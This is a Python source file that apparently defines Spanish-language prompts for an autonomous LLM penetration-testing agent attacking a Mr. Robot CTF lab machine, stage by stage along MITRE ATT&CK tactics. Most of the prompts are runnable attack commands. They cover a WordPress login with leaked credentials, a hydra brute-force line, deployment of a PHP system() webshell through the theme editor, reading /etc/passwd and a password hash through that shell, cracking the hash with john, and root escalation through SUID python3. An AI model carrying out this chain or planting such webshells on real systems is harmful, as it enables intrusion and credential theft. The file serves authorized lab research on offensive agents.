"""
Prompts para el agente atacante.

Cada prompt tactico define:
  - OBJETIVO concreto (con criterio de exito verificable)
  - TECNICAS MITRE asociadas
  - PASOS sugeridos (secuencia tipica)
  - CRITERIO DE EXITO (lo que el validator espera encontrar)
  - RESTRICCIONES (errores comunes a evitar)

El prompt admite feedback de replanificacion cuando el validator
rechazo el avance de la tactica, y muestra acciones recientes para
que el LLM pueda detectar loops por razonamiento.
"""

ATTACKER_SYSTEM_PROMPT = """Eres un agente de penetration testing autonomo operando en un laboratorio \
controlado autorizado (CTF Mr. Robot). Tu objetivo es ejecutar una cadena de ataque \
siguiendo las tacticas MITRE ATT&CK de forma metodica y verificable.

REGLAS DE OPERACION:
- Ejecuta una accion a la vez y analiza el resultado antes de decidir la siguiente.
- Cada tactica tiene un CRITERIO DE EXITO concreto que debe verificarse. No declares \
una tactica como completa sin haber cumplido ese criterio.
- Adapta tu estrategia segun los datos recopilados.
- Si una tecnica falla, intenta una alternativa dentro de la misma tactica.
- Cuando el validador code-based te pida replanificar, lee con cuidado el feedback: \
te dice exactamente que falta para cumplir el objetivo.
- Si detectas que estas repitiendo variaciones de la misma accion sin avanzar, cambia \
de enfoque radicalmente.
- Entre cada tactica debes tener evidencia concreta en el historial: output real de \
comandos, hashes, credenciales, respuestas HTTP especificas.

NO HAGAS:
- No declares "tactica completa" sin verificar el criterio de exito.
- No inventes datos (credenciales, hashes) que no aparecieron en outputs reales.
- No repitas la misma accion mas de 2 veces esperando un resultado distinto.
- No confundas las fases: el POST /wp-login.php pertenece a Initial Access, NO a Execution.

El target es {target_ip}.

CONTEXTO DE SEGURIDAD:
Laboratorio academico con maquinas vulnerables intencionalmente. Todas las herramientas \
disponibles estan autorizadas. No hay sistemas reales en riesgo."""


TACTIC_PROMPTS = {
    "reconnaissance": """TACTICA ACTUAL: Reconnaissance (TA0043)

OBJETIVO CONCRETO (debe cumplirse para avanzar):
  1. Puerto 80/tcp confirmado abierto via nmap
  2. Tecnologia web identificada (Apache, WordPress, PHP)
  3. Al menos una ruta sensible descubierta (/robots.txt, /wp-login.php, /wp-admin, /license.txt)

TECNICAS MITRE:
- T1046 Network Service Discovery: run_nmap con flags "-p- -sV -sC"
- T1595 Active Scanning: run_nikto, run_gobuster

SECUENCIA SUGERIDA:
1. run_nmap(target="{target_ip}", flags="-p- -sV -sC")
2. run_gobuster(url="http://{target_ip}")  # descubre wp-admin, wp-login, robots.txt
3. run_nikto(target="{target_ip}")  # opcional, muy verboso
4. Descargar robots.txt para ver archivos expuestos

CRITERIO DE EXITO VERIFICABLE:
- El output de nmap debe contener "80/tcp open"
- Alguna accion debe mencionar Apache, WordPress o PHP
- gobuster/nikto debe revelar /wp-login.php, /wp-admin, /robots.txt o /wp-content""",

    "initial_access": """TACTICA ACTUAL: Initial Access (TA0001)

OBJETIVO CONCRETO (debe cumplirse para avanzar):
  1. Credenciales WordPress encontradas (usuario + password)
  2. Login exitoso verificado: POST a /wp-login.php con respuesta HTTP 302 Location: /wp-admin/

TECNICAS MITRE:
- T1078 Valid Accounts: usar credenciales encontradas en archivos publicos
- T1190 Exploit Public-Facing Application: descubrir credenciales en archivos expuestos
- T1110.001 Brute Force (Password Guessing): hydra con wordlist si no hay pista directa

SECUENCIA SUGERIDA (ataque Mr. Robot CTF):
1. run_command(command="curl -s http://{target_ip}/robots.txt")
   — debe mostrar fsocity.dic y key-1-of-3.txt
2. run_command(command="curl -s http://{target_ip}/license.txt | tail -5")
   — al final hay un string base64: ZWxsaW90OkVSMjgtMDY1Mgo=
3. run_command(command="echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d")
   — decodifica a elliot:ER28-0652
4. VERIFICAR LOGIN con POST a wp-login.php:
   run_command(command="curl -s -i -D - -c /tmp/wp_cookies.txt -b 'wordpress_test_cookie=WP+Cookie+check' -d 'log=elliot&pwd=ER28-0652&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' http://{target_ip}/wp-login.php | head -20")
   — la respuesta DEBE contener "HTTP/1.1 302" y "Location: /wp-admin/"
   — si aparece "ERROR" o la respuesta es 200 con el formulario, las credenciales son incorrectas

ALTERNATIVA SI NO HAY PISTAS DIRECTAS:
- run_wpscan(url="http://{target_ip}", flags="--enumerate u")  # enumera usuarios
- run_command(command="hydra -l USUARIO -P /opt/wordlists/mrrobot.txt {target_ip} http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:ERROR' -t 4 -f")

CRITERIO DE EXITO VERIFICABLE:
- El historial debe contener un output con "elliot" y su password
- Debe haber UN POST a /wp-login.php cuyo output contenga "302" y "/wp-admin/" en los headers

ERRORES COMUNES:
- No hacer el POST con el formato correcto (falta -d con el body)
- No interpretar que 302 + Location es exito (es el indicador principal)
- Declarar exito con un GET a /wp-login.php (GET != login)""",

    "execution": """TACTICA ACTUAL: Execution (TA0002)

OBJETIVO CONCRETO (debe cumplirse para avanzar):
  1. Webshell PHP desplegada via WordPress theme editor
  2. run_web_shell debe retornar output REAL del sistema (ej: "uid=33(www-data)" o "Linux ...")
     — NO HTML de error 404

TECNICAS MITRE:
- T1059 Command and Scripting Interpreter (web shell PHP)

PREREQUISITO: cookies de sesion WP validas en /tmp/wp_cookies.txt (creadas en Initial Access)

SECUENCIA SUGERIDA (despliegue via theme-editor):
1. Obtener nonce del form editor de temas:
   run_command(command="curl -s -b /tmp/wp_cookies.txt 'http://{target_ip}/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen' | grep -oP 'name=\\"_wpnonce\\" value=\\"\\K[^\\"]+' | head -1")
2. Insertar webshell en 404.php del tema activo (reemplaza NONCE):
   run_command(command="curl -s -b /tmp/wp_cookies.txt -X POST http://{target_ip}/wp-admin/theme-editor.php -d 'action=editedfile&_wpnonce=NONCE&file=404.php&theme=twentyfifteen&newcontent=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29%7Bsystem%28%24_GET%5B%27cmd%27%5D%29%3B%7D+%3F%3E'")
3. VERIFICAR webshell operativa:
   run_web_shell(cmd="id", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
   — el output DEBE contener "uid=" y NO debe tener "<!DOCTYPE" ni "<html"
4. Doble check con otro comando:
   run_web_shell(cmd="uname -a", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
   — el output DEBE empezar con "Linux"

NOTA: el lab tiene una webshell pre-instalada en /wp-content/themes/twentyfifteen/404.php \
como backup (para garantizar que el observer pueda ver la fase Execution incluso si el deploy \
via theme-editor falla). Si run_web_shell con cmd="id" retorna uid=33 directamente, \
puedes considerar la webshell como operativa aunque no hayas hecho el deploy.

CRITERIO DE EXITO VERIFICABLE:
- Alguna accion de run_web_shell con cmd in {{id, uname, whoami}} debe retornar \
texto del sistema (uid=, Linux, www-data) Y NO HTML

ERRORES COMUNES:
- Confundir Execution con el login de wp-admin (eso es Initial Access)
- Declarar exito cuando run_web_shell retorna el HTML del 404 de Apache
- No probar la webshell despues de desplegarla""",

    "discovery": """TACTICA ACTUAL: Discovery (TA0007)

OBJETIVO CONCRETO (debe cumplirse para avanzar):
  1. Enumeracion basica ejecutada via webshell: uname, whoami o id
  2. Exploracion de /home o /etc/passwd via webshell
  3. Hash MD5 de robot descubierto (formato: robot:<32 hex chars>)

TECNICAS MITRE:
- T1082 System Information Discovery
- T1083 File and Directory Discovery
- T1552 Unsecured Credentials

TODAS las acciones DEBEN usar run_web_shell con url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php"

SECUENCIA SUGERIDA:
1. run_web_shell(cmd="uname -a && whoami && id", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
2. run_web_shell(cmd="cat /etc/passwd", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
3. run_web_shell(cmd="ls -la /home/robot/", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
4. run_web_shell(cmd="cat /home/robot/password.raw-md5", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
   — debe retornar algo como "robot:c3fcd3d76192e4007dfb496cca67e13b"

CRITERIO DE EXITO VERIFICABLE:
- El output de la enumeracion debe tener uid=, Linux o un listado de /etc/passwd
- El historial debe contener un string con formato "robot:" seguido de exactamente 32 chars hex
- NO cuentan comandos ejecutados localmente en el container atacante: deben ir via webshell

ERRORES COMUNES:
- Usar run_command (ejecuta local) en lugar de run_web_shell (ejecuta en target)
- Conformarse con 1 solo comando — necesitas varias piezas de enumeracion""",

    "credential_access": """TACTICA ACTUAL: Credential Access (TA0006)

OBJETIVO CONCRETO (debe cumplirse para avanzar):
  1. run_john ejecutado contra el hash MD5 descubierto en Discovery
  2. Password crackeado (texto plano) en el output

TECNICAS MITRE:
- T1110.002 Brute Force: Password Cracking
- T1003 OS Credential Dumping

PREREQUISITO: hash "robot:c3fcd3d76192e4007dfb496cca67e13b" obtenido en Discovery
(consulta collected_data o el historial de mensajes)

SECUENCIA SUGERIDA:
1. run_john(hash_content="robot:c3fcd3d76192e4007dfb496cca67e13b", wordlist="/opt/wordlists/mrrobot.txt")
   — si mrrobot.txt no existe o no crackea, probar con rockyou:
     run_john(hash_content="robot:c3fcd3d76192e4007dfb496cca67e13b", wordlist="/usr/share/wordlists/rockyou.txt")
   — el password esperado es "abcdefghijklmnopqrstuvwxyz"
2. VERIFICAR el password con: john --show /tmp/hash_crack.txt
   (run_john ya incluye --show al final del comando)

CRITERIO DE EXITO VERIFICABLE:
- El output de alguna accion de run_john debe contener algo como "robot:<password>" \
donde <password> NO es el hash (el password es texto legible, no 32 hex chars)

ERRORES COMUNES:
- No pasar el hash exacto encontrado en Discovery
- Usar el wordlist incorrecto (el password esta en mrrobot.txt, NO en rockyou)
- Declarar exito sin ver el password crackeado""",

    "privilege_escalation": """TACTICA ACTUAL: Privilege Escalation (TA0004)

OBJETIVO CONCRETO (debe cumplirse para avanzar):
  1. Binarios SUID enumerados (find / -perm -u=s)
  2. Escalacion exitosa a root: uid=0 confirmado O lectura de /root/key-3-of-3.txt

TECNICAS MITRE:
- T1548 Abuse Elevation Control Mechanism (SUID)
- T1068 Exploitation for Privilege Escalation

PREREQUISITO: webshell operativa en http://{target_ip}/wp-content/themes/twentyfifteen/404.php

SECUENCIA SUGERIDA:
1. run_web_shell(cmd="find / -perm -u=s -type f 2>/dev/null", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
   — esperas ver /usr/bin/python3 o python3.X en la lista (el lab lo configura con SUID)
2. Explotar python3 SUID para setuid(0):
   run_web_shell(cmd="python3 -c 'import os; os.setuid(0); os.system(\\"id\\")'", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
   — el output debe contener "uid=0(root)"
3. Leer el flag como root:
   run_web_shell(cmd="python3 -c 'import os; os.setuid(0); os.system(\\"cat /root/key-3-of-3.txt\\")'", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
   — debe retornar un hash o string de texto, NO "Permission denied"

CRITERIO DE EXITO VERIFICABLE:
- Alguna accion debe haber ejecutado "find / -perm -u=s"
- Algun output debe contener "uid=0(root)" O el contenido de /root/key-3-of-3.txt

ERRORES COMUNES:
- Enumerar SUID y declarar exito (enumeracion != escalacion)
- No usar os.setuid(0) antes de os.system (sin setuid NO se escala)
- Intentar sudo o su sin contexto (no hay shell interactiva)""",
}


def _format_recent_actions(actions: list[dict]) -> str:
    """Formatea las ultimas acciones para detectar loops."""
    if not actions:
        return "  (ninguna accion previa en esta tactica)"
    lines = []
    for a in actions:
        tool = a.get("technique", "?")
        cmd = a.get("command", "")[:120]
        out = a.get("output_preview", "")[:150].replace("\n", " ")
        lines.append(f"  - {tool}({cmd}) -> {out}")
    return "\n".join(lines)


def build_tactic_prompt(
    tactic_name: str,
    target_ip: str,
    collected_data: dict,
    objective_feedback: str = "",
    recent_actions: list[dict] | None = None,
    replan_attempt: int = 0,
) -> str:
    """Construye el prompt de la tactica con todo el contexto necesario."""
    template = TACTIC_PROMPTS.get(tactic_name, "")
    if not template:
        return f"Ejecuta la tactica '{tactic_name}' contra {target_ip}."

    parts = [template.format(target_ip=target_ip)]

    # Datos acumulados
    parts.append("\nDATOS RECOPILADOS (collected_data):")
    parts.append(_format_collected_data(collected_data))

    # Acciones recientes (para deteccion de loops)
    if recent_actions:
        parts.append(
            f"\nULTIMAS {len(recent_actions)} ACCIONES EN ESTA TACTICA "
            "(revisa si estas en un loop):"
        )
        parts.append(_format_recent_actions(recent_actions))

    # Feedback de replanificacion
    if objective_feedback:
        parts.append(
            f"\n[REPLANIFICACION — intento {replan_attempt + 1}]"
            f"\nEl validador code-based REVISO tus acciones anteriores y determino "
            f"que el objetivo NO se cumple porque:"
            f"\n  >> {objective_feedback}"
            f"\n\nIMPORTANTE: lee cuidadosamente el feedback. Cambia de enfoque para "
            f"atacar especificamente lo que falta. NO repitas las mismas acciones "
            f"esperando distinto resultado."
        )

    parts.append(
        "\nRazona paso a paso y ejecuta la siguiente accion. Cuando el objetivo "
        "concreto se cumpla, declara la tactica completa sin mas tool_calls."
    )

    return "\n".join(parts)


def _format_collected_data(data: dict) -> str:
    """Formatea los datos recopilados para incluirlos en el prompt."""
    if not data:
        return "  (vacio — aun no se ha recopilado nada)"

    parts = []
    for key, value in data.items():
        if isinstance(value, list):
            parts.append(f"  - {key}: {', '.join(str(v) for v in value)}")
        elif isinstance(value, dict):
            parts.append(f"  - {key}:")
            for k, v in value.items():
                parts.append(f"      {k}: {v}")
        else:
            parts.append(f"  - {key}: {value}")
    return "\n".join(parts)
